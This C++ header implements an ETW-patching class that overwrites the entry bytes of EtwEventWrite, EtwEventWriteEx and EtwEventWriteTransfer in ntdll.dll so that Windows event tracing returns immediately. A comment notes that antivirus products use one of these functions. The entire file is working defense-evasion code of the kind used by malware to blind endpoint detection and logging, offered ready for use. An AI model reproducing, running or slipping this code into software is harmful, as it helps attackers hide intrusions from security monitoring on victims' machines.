#pragma once

#ifdef _WIN32
#include <Windows.h>
#include <cstdint>
#include <string>

namespace nuub::domain {

// Patch ETW (Event Tracing for Windows) to prevent telemetry
class EtwPatch {
public:
    // Patch EtwEventWrite to return immediately (no telemetry)
    static bool patch_etw() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;

        // Get EtwEventWrite address
        auto etw_write = reinterpret_cast<uint8_t*>(
            GetProcAddress(ntdll, "EtwEventWrite"));
        if (!etw_write) return false;

        // Save old protection
        DWORD old_protect = 0;
        if (!VirtualProtect(etw_write, 1, PAGE_EXECUTE_READWRITE, &old_protect)) {
            return false;
        }

        // Patch: mov eax, 0; ret (return STATUS_SUCCESS immediately)
        // x86: B8 00 00 00 00 C3
        // x64: 48 33 C0 C3 (xor rax, rax; ret)
        #ifdef _WIN64
        etw_write[0] = 0x48; // REX.W prefix
        etw_write[1] = 0x33; // XOR
        etw_write[2] = 0xC0; // RAX, RAX
        etw_write[3] = 0xC3; // RET
        #else
        etw_write[0] = 0xB8; // MOV EAX
        etw_write[1] = 0x00; // 0
        etw_write[2] = 0x00;
        etw_write[3] = 0x00;
        etw_write[4] = 0x00;
        etw_write[5] = 0xC3; // RET
        #endif

        // Restore protection
        VirtualProtect(etw_write, 1, old_protect, &old_protect);

        return true;
    }

    // Patch EtwEventWriteEx
    static bool patch_etw_ex() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;

        auto etw_write_ex = reinterpret_cast<uint8_t*>(
            GetProcAddress(ntdll, "EtwEventWriteEx"));
        if (!etw_write_ex) return false;

        DWORD old_protect = 0;
        if (!VirtualProtect(etw_write_ex, 1, PAGE_EXECUTE_READWRITE, &old_protect)) {
            return false;
        }

        #ifdef _WIN64
        etw_write_ex[0] = 0x48;
        etw_write_ex[1] = 0x33;
        etw_write_ex[2] = 0xC0;
        etw_write_ex[3] = 0xC3;
        #else
        etw_write_ex[0] = 0xB8;
        etw_write_ex[1] = 0x00;
        etw_write_ex[2] = 0x00;
        etw_write_ex[3] = 0x00;
        etw_write_ex[4] = 0x00;
        etw_write_ex[5] = 0xC3;
        #endif

        VirtualProtect(etw_write_ex, 1, old_protect, &old_protect);
        return true;
    }

    // Patch EtwEventWriteTransfer (used by some AVs)
    static bool patch_etw_transfer() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;

        auto etw_transfer = reinterpret_cast<uint8_t*>(
            GetProcAddress(ntdll, "EtwEventWriteTransfer"));
        if (!etw_transfer) return false;

        DWORD old_protect = 0;
        if (!VirtualProtect(etw_transfer, 1, PAGE_EXECUTE_READWRITE, &old_protect)) {
            return false;
        }

        #ifdef _WIN64
        etw_transfer[0] = 0x48;
        etw_transfer[1] = 0x33;
        etw_transfer[2] = 0xC0;
        etw_transfer[3] = 0xC3;
        #else
        etw_transfer[0] = 0xB8;
        etw_transfer[1] = 0x00;
        etw_transfer[2] = 0x00;
        etw_transfer[3] = 0x00;
        etw_transfer[4] = 0x00;
        etw_transfer[5] = 0xC3;
        #endif

        VirtualProtect(etw_transfer, 1, old_protect, &old_protect);
        return true;
    }

    // Patch all ETW functions
    static void patch_all() {
        patch_etw();
        patch_etw_ex();
        patch_etw_transfer();
    }
};

} // namespace nuub::domain
#endif
